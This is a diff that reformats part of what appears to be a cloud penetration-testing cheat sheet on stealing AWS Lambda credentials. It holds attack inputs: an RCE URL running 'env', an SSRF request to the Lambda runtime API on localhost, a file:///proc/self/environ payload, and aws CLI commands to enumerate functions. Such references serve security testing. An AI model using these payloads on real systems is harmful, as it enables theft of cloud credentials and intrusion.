@@ -16,16 +16,22 @@
 
 ## Getting credentials using RCE
 
- - https://apigateway/prod/system?cmd=env
+    https://apigateway/prod/system?cmd=env
 
 ## Getting credentials using SSRF
 
- - https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/
+    https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/
 
 ## Getting credentials using SSRF and wrappers
 
- - https://apigateway/prod/system?cmd=file:///proc/self/environ
+    https://apigateway/prod/system?cmd=file:///proc/self/environ
 
 ## Getting credentials from lambda enviroment variables (cli)
 
- - aws lambda get-function --function-name NAME (It's important to enumerate the functions first with: aws lambda list-functions)
+### It's important to enumerate the functions first with: 
+
+    aws lambda list-functions
+
+### Then:
+
+    aws lambda get-function --function-name NAME 
